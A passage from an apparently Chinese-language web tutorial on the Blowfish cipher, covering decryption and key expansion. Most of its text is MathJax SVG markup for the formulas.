46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mspace" transform="translate(24857.5,0)"></g><g data-mml-node="msup" transform="translate(25357.2,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(26647.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container> </p>
<p>解密操作时需要将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="14.167ex" height="1.984ex" role="img" focusable="false" viewBox="0 -683 6261.9 877"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1523.2,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2601.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(3046.4,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(4385.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4829.8,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="TeXAtom" transform="translate(675,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>颠倒，其他与加密操作完全相同。</p>
<h2 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h2><ol>
<li><p>  首先用一个固定的字符串初始化P数组，然后按顺序初始化四个S盒。该字符串是随机选取的，例如可由<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.538ex" role="img" focusable="false" viewBox="0 -680 750 680"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="3A0" d="M128 619Q121 626 117 628T101 631T58 634H25V680H724V634H691Q651 633 640 631T622 619V61Q628 51 639 49T691 46H724V0H713Q692 3 569 3Q434 3 425 0H414V46H447Q489 47 498 49T517 61V634H232V348L233 61Q239 51 250 49T302 46H335V0H324Q303 3 180 3Q45 3 36 0H25V46H58Q100 47 109 49T128 61V619Z"></path></g></g></g></svg></mjx-container>的十六进制数字(减去最初的3)组成。</p>
</li>
<li><p>  Blowfish的密钥长度为1-448bits，可以分成1-14个32bits的数据块，记作<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="15.572ex" height="1.984ex" role="img" focusable="false" viewBox="0 -683 6882.9 877"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g><g data-mml-node="mn" transform="translate(882,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1285.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1730.2,0)"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g><g data-mml-node="mn" transform="translate(882,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(3015.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(3460.4,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(4799.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5243.8,0)"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g><g data-mml-node="TeXAtom" transform="translate(882,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>。</p>
</li>
<li><p>接下来需要使用<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.699ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 751 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g></g></g></svg></mjx-container>和<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.011ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 889 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g></g></g></svg></mjx-container>进行异或操作，生成最终的<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.699ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 751 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g></g></g></svg></mjx-container>数组，由于<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.011ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 889 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g></g></g></svg></mjx-container>的数量少于<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.699ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 751 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g></g></g></svg></mjx-container>，因此<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.011ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 889 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g></g></g></svg></mjx-container>需要循环使用，得到最终的<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.699ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 751 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g></g></g></svg></mjx-container>数组。假设<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.011ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 889 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g></g></g></svg></mjx-container>只有13个，则</p>
<p>  <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="13.572ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 5998.7 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 